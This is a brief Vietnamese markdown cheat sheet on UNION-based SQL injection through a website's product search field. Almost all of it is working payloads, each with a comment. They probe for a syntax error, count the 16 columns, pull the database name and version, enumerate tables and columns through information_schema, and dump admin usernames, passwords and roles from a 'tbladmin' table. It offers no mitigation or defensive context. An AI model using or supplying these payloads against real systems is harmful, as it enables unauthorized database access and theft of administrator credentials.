# SQL Injection

Một số nguyên tắc
- Kết thúc lệnh bằng: "-- "(có dấu cách) để toàn bộ đoạn sau thành comment


```
// Thử search trên ô tìm kiếm
may tho'
# You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''' at line 1
# SELECT * FROM tblsanpham WHERE status=1 AND title LIKE '%man'%'

// Thử tiếp (nhớ có dấu cách cuối câu lệnh) xem có thành công không
may tho%' UNION SELECT * FROM tblsanpham WHERE status=1 AND title LIKE '%mau%' -- 

// Tìm kiếm xem câu select trước đó có bao nhiêu field
// Thay đổi số lượng số 1 đến khi đủ field thì thôi (như trường hợp này ta dò được 16 field)
may tho%' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 -- 
# The used SELECT statements have a different number of columns
# SELECT * FROM tblsanpham WHERE status=1 AND title LIKE '%may tho%' UNION SELECT 1,2,3,4 -- %'

// Tiếp tục đổi từng field để lấy thêm thông tin Database
may tho%' UNION SELECT 1,Database(),3,4,5,6,@@version,8,9,10,11,12,13,14,15,16 -- 

// Lấy danh sách các table_name trong database
may tho%' UNION SELECT 1,Database(),3,4,5,6,table_name,8,9,10,11,12,13,14,15,16 FROM information_schema.tables -- 

// Lấy danh sách các column_name trong một table (ví dụ table có tên 'tbladmin')
may tho%' UNION SELECT 1,Database(),3,4,5,6,column_name,8,9,10,11,12,13,14,15,16 FROM information_schema.columns WHERE table_name='tbladmin' -- 

// Lấy danh sách bản ghi trong table 'tbladmin'
may tho%' UNION SELECT 1,name,3,4,5,6,pass,8,9,10,11,12,13,14,15,16 FROM tbladmin -- 

// Lấy nhiều hơn
may tho%' UNION SELECT 1,name,3,4,5,6,pass,8,9,10,11,12,13,14,15,16 FROM tbladmin UNION SELECT 1,role,3,4,5,6,status,8,9,10,11,12,13,14,15,16 FROM tbladmin -- 
```
